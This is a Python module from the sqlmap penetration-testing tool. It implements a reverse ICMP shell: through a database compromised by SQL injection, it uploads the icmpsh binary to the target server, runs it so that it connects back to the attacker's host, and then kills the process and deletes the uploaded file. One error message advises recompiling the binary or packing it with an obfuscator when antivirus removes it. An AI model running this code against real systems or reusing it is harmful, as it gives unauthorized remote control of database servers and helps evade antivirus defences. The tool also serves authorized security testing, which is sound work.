#!/usr/bin/env python

"""
Copyright (c) 2006-2014 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import os
import time

from extra.icmpsh.icmpsh_m import main as icmpshmain
from lib.core.common import getLocalIP
from lib.core.common import getRemoteIP
from lib.core.common import normalizePath
from lib.core.common import ntToPosixSlashes
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import logger
from lib.core.data import paths

class ICMPsh:
    """
    This class defines methods to call icmpsh for plugins.
    """

    def _initVars(self):
        self.lhostStr = None
        self.rhostStr = None
        self.localIP = getLocalIP()
        self.remoteIP = getRemoteIP() or conf.hostname
        self._icmpsubordinate = normalizePath(os.path.join(paths.SQLMAP_EXTRAS_PATH, "icmpsh", "icmpsh.exe_"))

    def _selectRhost(self):
        message = "what is the back-end DBMS address? [%s] " % self.remoteIP
        address = readInput(message, default=self.remoteIP)

        return address

    def _selectLhost(self):
        message = "what is the local address? [%s] " % self.localIP
        address = readInput(message, default=self.localIP)

        return address

    def _prepareIngredients(self, encode=True):
        self.lhostStr = ICMPsh._selectLhost(self)
        self.rhostStr = ICMPsh._selectRhost(self)

    def _runIcmpshMain(self):
        infoMsg = "running icmpsh main locally"
        logger.info(infoMsg)

        icmpshmain(self.lhostStr, self.rhostStr)

    def _runIcmpshSubordinateRemote(self):
        infoMsg = "running icmpsh subordinate remotely"
        logger.info(infoMsg)

        cmd = "%s -t %s -d 500 -b 30 -s 128 &" % (self._icmpsubordinateRemote, self.lhostStr)

        self.execCmd(cmd, silent=True)

    def uploadIcmpshSubordinate(self, web=False):
        ICMPsh._initVars(self)
        self._randStr = randomStr(lowercase=True)
        self._icmpsubordinateRemoteBase = "tmpi%s.exe" % self._randStr

        self._icmpsubordinateRemote = "%s/%s" % (conf.tmpPath, self._icmpsubordinateRemoteBase)
        self._icmpsubordinateRemote = ntToPosixSlashes(normalizePath(self._icmpsubordinateRemote))

        logger.info("uploading icmpsh subordinate to '%s'" % self._icmpsubordinateRemote)

        if web:
            written = self.webUpload(self._icmpsubordinateRemote, os.path.split(self._icmpsubordinateRemote)[0], filepath=self._icmpsubordinate)
        else:
            written = self.writeFile(self._icmpsubordinate, self._icmpsubordinateRemote, "binary", forceCheck=True)

        if written is not True:
            errMsg = "there has been a problem uploading icmpsh, it "
            errMsg += "looks like the binary file has not been written "
            errMsg += "on the database underlying file system or an AV has "
            errMsg += "flagged it as malicious and removed it. In such a case "
            errMsg += "it is recommended to recompile icmpsh with slight "
            errMsg += "modification to the source code or pack it with an "
            errMsg += "obfuscator software"
            logger.error(errMsg)

            return False
        else:
            logger.info("icmpsh successfully uploaded")
            return True

    def icmpPwn(self):
        ICMPsh._prepareIngredients(self)
        self._runIcmpshSubordinateRemote()
        self._runIcmpshMain()

        debugMsg = "icmpsh main exited"
        logger.debug(debugMsg)

        time.sleep(1)
        self.execCmd("taskkill /F /IM %s" % self._icmpsubordinateRemoteBase, silent=True)
        time.sleep(1)
        self.delRemoteFile(self._icmpsubordinateRemote)
